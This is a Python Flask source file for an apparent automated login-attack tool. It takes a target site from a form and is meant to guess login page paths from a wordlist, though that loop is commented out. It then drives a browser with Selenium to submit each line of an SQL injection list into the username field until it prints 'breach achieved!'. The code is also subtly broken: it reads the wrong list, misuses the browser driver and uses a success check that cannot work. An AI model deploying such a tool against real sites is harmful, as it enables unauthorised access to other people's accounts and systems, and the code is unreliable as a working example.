import selenium.common
import requests
from fake_useragent import UserAgent
from flask import Flask, request, render_template, redirect, url_for
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as ec
from selenium.webdriver.support.wait import WebDriverWait

''' A majority of the code beyond this point was taken from https://github.com/kaloomte/login-snitcher '''

ua = UserAgent()
app = Flask(__name__, template_folder='templates')


class ColorPalette:
    G = '\033[92m'  # green
    Y = '\033[93m'  # yellow
    B = '\033[94m'  # blue
    R = '\033[91m'  # red
    W = '\033[0m'  # white
    M = '\u001b[35m'  # magenta
    P = '\033[95m'  # purple


def read_wordlist():
    with open("login_wordlist.txt") as text_file:
        wordlist = text_file.read()
        splitted_wordlist = wordlist.strip().split("\n")
    return splitted_wordlist


def read_sql_list():
    with open("login_wordlist.txt") as text_file:
        sql_list = text_file.read()
        splitted_sql_list = sql_list.strip().split("\n")
    return splitted_sql_list


def check_for_elements(fu):
    # go to the webpage
    driver = webdriver.Edge(fu)

    # try different ID combinations to find username, password, and submit button of page
    try:
        username = driver.find_element(By.ID, "username")
        password = driver.find_element(By.ID, "password")
        button = driver.find_element(By.ID, "button")
    except selenium.common.exceptions.NoSuchElementException:
        try:
            username = driver.find_element(By.ID, "email")
            password = driver.find_element(By.ID, "password")
            button = driver.find_element(By.ID, "button")
        except selenium.common.exceptions.NoSuchElementException:
            try:
                username = driver.find_element(By.ID, "username")
                password = driver.find_element(By.ID, "password")
                button = driver.find_element(By.ID, "submit")
            except selenium.common.exceptions.NoSuchElementException:
                try:
                    username = driver.find_element(By.ID, "email")
                    password = driver.find_element(By.ID, "password")
                    button = driver.find_element(By.ID, "submit")
                except selenium.common.exceptions.NoSuchElementException:
                    return

    return_list = [username, password, button]

    return return_list


def login_check(fu):

    print("checking login now")
    driver = webdriver.Edge(fu)

    returned_list = check_for_elements(fu)

    if returned_list is None:
        return
    else:
        username = returned_list[0]
        password = returned_list[1]
        button = returned_list[2]

    # retrieve list of SQL injections
    sql_list = read_sql_list()

    # loop through injection options
    for x in sql_list:
        username.send_keys(x)
        password.send_keys("password")
        driver.execute_script("arguments[0].click();", button)
        # if injection didn't work, try another one
        if ec.presence_of_element_located((By.ID, "username")):
            username.clear()
            password.clear()
        else:
            # otherwise, alert user
            print("breach achieved!")
            break

    # tell driver to wait until webpage gives an alert (it never will), this is so progress can be observed
    WebDriverWait(driver, 1000).until(ec.alert_is_present(), "done")


tasks = []


@app.route("/searching/")
def search_login(url_string):
    word_list = read_wordlist()
    counter = 0

    # for word in word_list:
    #     name = url_string + word
    #     status_code = requests.get(name).status_code
    #     if status_code == 200:
    #         print(f"{name} {ColorPalette.M} --> {ColorPalette.G} Boom! {ColorPalette.W}")
    #         tasks.append(name)
    #     elif status_code == 403:
    #         print(f"{name} {ColorPalette.M} --> {ColorPalette.B} Forbidden! {ColorPalette.W}")
    #     elif status_code == 404:
    #         print(f"{name} {ColorPalette.M} --> {ColorPalette.R} Not Found! {ColorPalette.W}")
    #     elif status_code in [302, 301]:
    #         print(f"{name} {ColorPalette.M} --> {ColorPalette.Y} Redirecting! {ColorPalette.W}")
    #     elif status_code == 429:
    #         print(f"{name} {ColorPalette.M} --> {ColorPalette.P} Too many requests! {ColorPalette.W}")
    #     else:
    #         print(f"{ColorPalette.B} {name} {ColorPalette.W}  --> {status_code} ")
    #     counter += 1

    return render_template("buffer.html")


@app.route("/", methods=["POST", "GET"])
def home():
    # main function, responsible for retrieving information from user and deploying functions accordingly
    if request.method == "POST":
        url_string = request.form["nm"]
        if url_string[0:3] == "www":
            url_string = "https://" + url_string
        elif url_string[0:8] == "https://":
            url_string = url_string
        else:
            url_string = "https://www." + url_string

        if not url_string.endswith('/'):
            url_string += '/'

        search_login(url_string)

        if len(tasks) > 0:
            print(f"Found {len(tasks)}")
        else:
            print("Found nothing!")

        for fu in tasks:
            login_check(fu)

    return render_template("index.html")


if __name__ == "__main__":
    app.run(port=5000)
